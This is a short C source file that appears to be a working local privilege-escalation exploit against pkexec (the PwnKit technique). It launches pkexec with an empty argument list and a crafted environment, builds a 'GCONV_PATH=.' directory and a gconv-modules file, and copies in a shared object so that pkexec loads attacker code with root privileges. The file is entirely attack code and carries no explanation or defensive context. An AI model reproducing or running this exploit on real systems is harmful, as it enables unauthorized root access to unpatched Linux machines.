#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define BIN "/usr/bin/pkexec"
#define DIR "audiobahn"
#define AUDIOBAHNSO "audiobahn"

int main()
{
    char *envp[] = {
        DIR,
        "PATH=GCONV_PATH=.",
        "SHELL=audiobahn",
        "CHARSET=audiobahn",
        NULL
    };
    char *argv[] = { NULL };

    system("mkdir GCONV_PATH=.");
    system("touch GCONV_PATH=./" DIR " && chmod +x GCONV_PATH=./" DIR);
    system("mkdir " DIR);
    system("echo 'module\tINTERNAL\t\t\taudiobahn//\t\t\t" AUDIOBAHNSO "\t\t\t2' > " DIR "/gconv-modules");
    system("cp " AUDIOBAHNSO ".so " DIR);

    execve(BIN, argv, envp);

    return 0;
}
